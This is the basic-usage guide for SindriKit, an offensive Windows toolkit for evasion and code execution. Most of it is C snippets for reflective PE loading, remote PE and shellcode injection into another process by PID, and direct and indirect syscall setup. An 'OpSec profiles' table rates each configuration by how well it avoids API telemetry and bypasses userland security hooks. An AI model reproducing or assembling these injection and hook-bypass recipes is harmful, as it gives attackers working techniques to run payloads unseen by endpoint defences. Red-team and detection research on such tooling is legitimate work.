# Basic Usage: The Core Engine

SindriKit is an extensible evasion and execution toolkit. Reflective loading and classic remote injection are **domains built on top of** shared primitives — memory, modules, process, mapping, syscalls, and execution bridges (FFI, Heaven's Gate).

To use the framework effectively, separate **Intent** (what you want to accomplish) from **Execution mechanics** (how the OS is contacted).

---

## 1. Include hierarchy

| Include | Pulls in |
|---|---|
| `sindri.h` | Everything: common, parsers, primitives, loaders, injection |
| `sindri/primitives.h` | Memory, modules, process, mapping, syscalls, FFI, Heaven's Gate |
| `sindri/common.h` | Buffer, hash, status, debug, disk, string, memory helpers |
| `sindri/loaders.h` | Reflective PE loader context and chains |
| `sindri/injection.h` | Shared injection context and classic chains |

PoCs typically include `sindri.h` plus any headers needed for explicit bootstrap (e.g. `sindri/primitives/syscalls.h`).

---

## 2. Core philosophy: dependency injection

High-level domains never call `VirtualAlloc` or `NtAllocateVirtualMemory` directly. They call through injected API tables:

| Table | Examples | Used by |
|---|---|---|
| `snd_memory_api_t` (`mem_api`) | `snd_mem_win`, `snd_mem_nt`, `snd_mem_sys` | Loaders, local mapping |
| `snd_module_api_t` (`mod_api`) | `snd_mod_win`, `snd_mod_nt` | Loaders, import resolution |
| `snd_process_api_t` (`proc_api`) | `snd_proc_win`, `snd_proc_nt`, `snd_proc_sys` | Injection |
| `snd_mapping_api_t` | `snd_map_win`, `snd_map_nt`, `snd_map_sys` | KnownDlls bootstrap |

Swapping `ctx.mem_api = &snd_mem_win` to `&snd_mem_sys` changes the entire operational footprint without touching loader logic.

See [Dependency injection](../architecture/dependency_injection.md) for the full pattern.

---

## 3. Explicit bootstrap (no implicit globals)

> [!IMPORTANT]
> Syscall-backed backends (`snd_mem_sys`, `snd_proc_sys`) and the syscall resolution pipeline require **explicit initialization**. The engine does not auto-discover a clean `ntdll` base or SSN table (unless `SND_USE_DEFAULTS=ON`, where only `snd_syscall_set_ntdll()` is strictly required).

### Minimum syscall bootstrap

```c
PVOID ntdll = NULL;

// Option A: KnownDlls (preferred for inject_pe / production syscall paths)
status = snd_om_knowndll_map(&snd_map_nt, L"ntdll.dll", &ntdll);

// Option B: PEB walk (no disk I/O)
// status = snd_peb_get_module_base_hash(SND_HASH_NTDLL_DLL, &ntdll);

// Option C: disk load
// ...

snd_syscall_set_ntdll(ntdll);
snd_syscall_set_resolver(snd_syscall_resolve_ssn_scan);
snd_syscall_add_resolver(snd_syscall_resolve_ssn_sort);

snd_syscall_set_invoker(snd_syscall_direct_invoke_asm);
// or for indirect syscalls:
// snd_syscall_set_invoker(snd_syscall_indirect_invoke_asm);
// snd_syscall_set_gadget_finder(snd_syscall_find_gadget_scan);
```

| Step | Purpose |
|---|---|
| Obtain `ntdll` base | SSN scan/sort read export stubs from this image |
| `snd_syscall_set_ntdll` | Registers the base for all resolvers |
| `snd_syscall_set_resolver` | Primary resolver (scan) |
| `snd_syscall_add_resolver` | Fallback resolver (sort) |
| `snd_syscall_set_invoker` | Selects direct or indirect invocation |
| `snd_syscall_set_gadget_finder` | Required for indirect invocation only |

Even when using **`snd_mem_nt`** (in-process `ntdll` stubs, not direct syscalls), PoCs still bootstrap the pipeline so upgrading to **`snd_mem_sys`** requires no other code changes.

Details: [Syscalls pipeline](../domains/primitives/syscalls/pipeline.md).

---

## 4. Loader workflow

Reflective loading uses a per-technique context `snd_ldr_pe_ctx_t`:

```c
snd_ldr_pe_ctx_t ctx = {0};
ctx.mem_api    = &snd_mem_win;   // or snd_mem_nt / snd_mem_sys
ctx.mod_api    = &snd_mod_win;   // or snd_mod_nt
ctx.raw_source = &file_buf;      // snd_buffer_t from snd_disk_buffer_load

status = snd_ldr_pe_prepare_image(&ctx);   // map, relocate, imports, protections
if (SND_FAILED(status)) { /* handle */ }

status = snd_ldr_pe_execute_image(&ctx);   // TLS + DllMain / EXE entry (chain.c)
if (SND_FAILED(status)) { /* handle */ }

// Optional: call a named export with arbitrary args
FARPROC fn = NULL;
snd_ldr_pe_get_proc_address(&ctx, "MyExport", &fn);
UINT_PTR args[] = { (UINT_PTR)0x1337 };
UINT_PTR ret = snd_ffi_execute((PVOID)(UINT_PTR)fn, 1, args);

snd_ldr_pe_detach_image(&ctx);       // after EXECUTED: DllMain/TLS detach + free (local only)
snd_ldr_pe_free_mapped_image(&ctx);  // free if detach was skipped or already partially cleaned
snd_buffer_free(&file_buf);
```

**Execution bridge:** `snd_ffi_execute` (`include/sindri/primitives/ffi.h`) is the public API for calling resolved exports with unknown signatures. See [FFI](../domains/primitives/execution/ffi.md).

---

## 5. Injection workflow

Injection uses a **shared** context `snd_inj_ctx_t` across classic techniques (unlike loaders, where each technique owns its own loader context):

```c
snd_ldr_pe_ctx_t ldr_ctx = {0};  // local bake
snd_inj_ctx_t    inj_ctx = {0};  // remote target

ldr_ctx.mem_api    = &snd_mem_sys;
ldr_ctx.mod_api    = &snd_mod_nt;
ldr_ctx.raw_source = &file_buf;

inj_ctx.target_pid = target_pid;
inj_ctx.proc_api   = &snd_proc_sys;

status = snd_inj_classic_pe(&ldr_ctx, &inj_ctx);   // PE map + remote execute
// or: snd_inj_classic_shell(&inj_ctx) with inj_ctx.payload set

snd_inj_cleanup(&inj_ctx);
```

Shellcode-only injection skips the loader context:

```c
snd_inj_ctx_t inj_ctx = {0};
inj_ctx.proc_api   = &snd_proc_win;
inj_ctx.target_pid = pid;
inj_ctx.payload    = &shellcode_buf;

status = snd_inj_classic_shell(&inj_ctx);
snd_inj_cleanup(&inj_ctx);
```

---

## 6. OpSec profiles (PoC mapping)

| Profile | PoC | Memory | Modules | Process | Syscall bootstrap |
|---|---|---|---|---|---|
| Diagnostic | `loader_winapi` | `snd_mem_win` | `snd_mod_win` | — | Optional |
| NT stubs | `loader_nowinapi` | `snd_mem_nt` | `snd_mod_nt` | — | Required (disk `ntdll`) |
| Direct/Indirect syscalls | `inject_pe` | `snd_mem_sys` | `snd_mod_nt` | `snd_proc_sys` | Required (KnownDlls) |
| CRT-less | `loader_noCRT_nowinapi` | `snd_mem_win` | `snd_mod_nt` | — | Minimal |
| Shellcode inject | `inject_shell` | — | — | `snd_proc_win` | Yes (KnownDlls; unused while `_win`) |
| WoW64 x64 exec | `heavens_gate` | Win32 demo alloc | — | — | N/A |

Full walkthroughs: [Examples](../examples/README.md).

### Profile A — Win32 (`loader_winapi`)

```c
snd_ldr_pe_ctx_t ctx = {0};
ctx.mem_api = &snd_mem_win;
ctx.mod_api = &snd_mod_win;
// prepare → execute → optional snd_ffi_execute for -e export
```

Maximum stability; every memory operation hits hooked userland stubs.

### Profile B — NT API (`loader_nowinapi`)

```c
// Bootstrap (Section 3), then:
ctx.mem_api = &snd_mem_nt;
ctx.mod_api = &snd_mod_nt;
```

Avoids `VirtualAlloc` / `LoadLibrary` telemetry; calls still pass through in-process `ntdll` where hooks may fire.

### Profile C — Direct syscalls (`inject_pe`)

```c
snd_om_knowndll_map(&snd_map_nt, L"ntdll.dll", &ntdll);
snd_syscall_set_ntdll(ntdll);
snd_syscall_set_resolver(snd_syscall_resolve_ssn_scan);
snd_syscall_add_resolver(snd_syscall_resolve_ssn_sort);
snd_syscall_set_invoker(snd_syscall_indirect_invoke_asm);
snd_syscall_set_gadget_finder(snd_syscall_find_gadget_scan);

ldr_ctx.mem_api = &snd_mem_sys;
ldr_ctx.mod_api = &snd_mod_nt;
inj_ctx.proc_api = &snd_proc_sys;
snd_inj_classic_pe(&ldr_ctx, &inj_ctx);
```

Bypasses userland hooks for local syscall memory ops and remote process manipulation.

---

## 7. Status handling

All domain functions return `snd_status_t`. Use `SND_SUCCEEDED` / `SND_FAILED` macros:

```c
if (SND_FAILED(status)) {
    snd_status_print(status);  // meaningful when SND_ENABLE_DEBUG=ON
    return status.code;
}
```

See [Status system](../architecture/status_system.md) and [Common status API](../common/api_reference.md#status-sindricommonstatush).

---

## Next steps

- [Building SindriKit](building.md) — CMake options, CRT-less tiers, first PoC build
- [Loaders domain](../domains/loaders/README.md)
- [Injection domain](../domains/injection/README.md)
- [Execution primitives](../domains/primitives/execution/README.md)
